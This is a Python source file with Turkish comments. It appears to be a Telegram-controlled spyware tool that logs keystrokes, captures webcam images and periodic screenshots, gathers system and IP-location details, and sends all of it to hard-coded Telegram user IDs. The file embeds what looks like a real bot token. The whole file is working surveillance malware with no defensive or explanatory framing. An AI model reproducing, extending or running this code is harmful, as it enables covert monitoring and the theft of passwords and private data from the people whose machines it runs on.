import os
import asyncio
import requests
import pyautogui
import logging
import cv2
from datetime import datetime
from pynput import keyboard
from telegram import Update, Bot
from telegram.ext import (
    ApplicationBuilder, CommandHandler, ContextTypes
)
import platform
import socket
import getpass
import psutil
import time

# Telegram bot bilgileri
TOKEN = "7766563294:AAH4ukitMlTZIWNldan3-0v-wEjsTPxhS6Q"
AUTHORIZED_USERS = [6434083932, 1958138181]

bot = Bot(token=TOKEN)

# Logger
logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)

# Global değişkenler
keystrokes = ""
keylogger_listener = None

# Modül aktiflik durumu
active_modules = {
    "keylogger": False,
    "auto_screenshot": False,
}

# 📸 Webcam görüntüsü al
def capture_webcam():
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        file_name = f"webcam_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
        if ret:
            cv2.imwrite(file_name, frame)
        cap.release()
        return file_name if ret else None
    except Exception as e:
        logging.error(f"Webcam hatası: {e}")
        return None

# 🌐 IP ve konum bilgisi al
def get_ip_and_location():
    try:
        response = requests.get("https://ipinfo.io/json")
        data = response.json()
        return f"""
🌐 IP Bilgisi:
IP: {data.get("ip")}
Şehir: {data.get("city")}
Bölge: {data.get("region")}
Ülke: {data.get("country")}
Konum: {data.get("loc")}
Servis Sağlayıcı: {data.get("org")}
"""
    except Exception as e:
        return f"Konum alınamadı: {e}"

# 💻 Sistem bilgisi al
def get_system_info():
    try:
        uname = platform.uname()
        boot_time = datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
        uptime_seconds = time.time() - psutil.boot_time()
        uptime_str = str(datetime.utcfromtimestamp(uptime_seconds).strftime("%H saat %M dakika %S saniye"))

        net_info = ""
        addrs = psutil.net_if_addrs()
        for interface_name, addr_list in addrs.items():
            for addr in addr_list:
                if addr.family == socket.AF_INET:
                    net_info += f"{interface_name}: {addr.address}\n"

        info = f"""
👤 Kullanıcı: {getpass.getuser()}
💻 Sistem Adı: {uname.node}
🖥️ İşletim Sistemi: {uname.system} {uname.release} ({uname.machine})
🧠 CPU: {uname.processor}
📊 RAM: {round(psutil.virtual_memory().total / (1024 ** 3), 2)} GB
⏱️ Açık Kalma Süresi: {uptime_str}
🌐 Ağ Adaptörleri:
{net_info if net_info else 'Ağ adaptörü bulunamadı.'}
🕰️ Açılış Zamanı: {boot_time}
"""
        return info
    except Exception as e:
        return f"Sistem bilgisi alınamadı: {e}"

# 🎹 Keylogger fonksiyonları
def on_press(key):
    global keystrokes
    try:
        keystrokes += key.char
    except AttributeError:
        keystrokes += f" [{key}] "

def start_keylogger():
    global keylogger_listener
    if keylogger_listener is None:
        keylogger_listener = keyboard.Listener(on_press=on_press)
        keylogger_listener.start()

def stop_keylogger():
    global keylogger_listener
    if keylogger_listener:
        keylogger_listener.stop()
        keylogger_listener = None

# 📸 Ekran görüntüsü otomatik gönderme görev fonksiyonu
async def auto_screenshot_task():
    while True:
        if active_modules["auto_screenshot"]:
            try:
                zaman = datetime.now().strftime("%Y%m%d_%H%M%S")
                dosya = f"screenshot_{zaman}.png"
                pyautogui.screenshot(dosya)
                for user_id in AUTHORIZED_USERS:
                    await bot.send_photo(chat_id=user_id, photo=open(dosya, "rb"))
                os.remove(dosya)
            except Exception as e:
                for user_id in AUTHORIZED_USERS:
                    await bot.send_message(chat_id=user_id, text=f"Ekran görüntüsü hatası: {e}")
        await asyncio.sleep(5)

# 📝 Keylog verisi gönderme görev fonksiyonu
async def send_keystrokes_task():
    global keystrokes
    while True:
        if active_modules["keylogger"] and keystrokes:
            try:
                dosya = "keystrokes.txt"
                with open(dosya, "w", encoding="utf-8") as f:
                    f.write(keystrokes)
                for user_id in AUTHORIZED_USERS:
                    await bot.send_document(chat_id=user_id, document=open(dosya, "rb"))
                os.remove(dosya)
                keystrokes = ""
            except Exception as e:
                for user_id in AUTHORIZED_USERS:
                    await bot.send_message(chat_id=user_id, text=f"Keylog hatası: {e}")
        await asyncio.sleep(10)

# Telegram Komutları

# 🔄 Modül aç/kapa komutu
async def toggle_module(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in AUTHORIZED_USERS:
        await update.message.reply_text("Yetkisiz kullanıcı.")
        return

    if not context.args:
        await update.message.reply_text("Lütfen bir modül ismi yazın: keylogger, auto_screenshot")
        return

    mod_name = context.args[0].lower()

    if mod_name not in active_modules:
        await update.message.reply_text("Bilinmeyen modül ismi.")
        return

    current_status = active_modules[mod_name]
    active_modules[mod_name] = not current_status
    new_status = active_modules[mod_name]

    if mod_name == "keylogger":
        if new_status:
            start_keylogger()
        else:
            stop_keylogger()

    durum_text = "aktif" if new_status else "pasif"
    await update.message.reply_text(f"{mod_name} modülü {durum_text} edildi.")

# /info komutu
async def info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in AUTHORIZED_USERS:
        await update.message.reply_text("Yetkisiz kullanıcı.")
        return

    await update.message.reply_text(get_ip_and_location())

    webcam_file = capture_webcam()
    if webcam_file:
        await context.bot.send_photo(chat_id=update.effective_user.id, photo=open(webcam_file, "rb"))
        os.remove(webcam_file)

# /photo komutu
async def photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in AUTHORIZED_USERS:
        await update.message.reply_text("Yetkisiz kullanıcı.")
        return

    zaman = datetime.now().strftime("%Y%m%d_%H%M%S")
    dosya = f"screenshot_{zaman}.png"
    pyautogui.screenshot(dosya)
    await context.bot.send_photo(chat_id=update.effective_user.id, photo=open(dosya, "rb"))
    os.remove(dosya)

# /keys komutu
async def keys(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in AUTHORIZED_USERS:
        await update.message.reply_text("Yetkisiz kullanıcı.")
        return

    dosya = "keystrokes.txt"
    with open(dosya, "w", encoding="utf-8") as f:
        f.write(keystrokes)
    await context.bot.send_document(chat_id=update.effective_user.id, document=open(dosya, "rb"))
    os.remove(dosya)

# /system komutu: Sistem bilgilerini gönderir
async def system(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in AUTHORIZED_USERS:
        await update.message.reply_text("Yetkisiz kullanıcı.")
        return
    await update.message.reply_text(get_system_info())

# /start komutu
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in AUTHORIZED_USERS:
        await update.message.reply_text("Yetkisiz kullanıcı.")
        return

    mod_durumlari = "\n".join([f"{mod}: {'aktif' if durum else 'pasif'}" for mod, durum in active_modules.items()])
    await update.message.reply_text(f"Bot hazır.\nModül durumları:\n{mod_durumlari}")

# Ana döngü
async def main():
    app = ApplicationBuilder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("info", info))
    app.add_handler(CommandHandler("photo", photo))
    app.add_handler(CommandHandler("keys", keys))
    app.add_handler(CommandHandler("toggle_module", toggle_module))
    app.add_handler(CommandHandler("system", system))

    asyncio.create_task(auto_screenshot_task())
    asyncio.create_task(send_keystrokes_task())

    await app.run_polling()

if __name__ == "__main__":
    import nest_asyncio
    nest_asyncio.apply()
    asyncio.run(main())
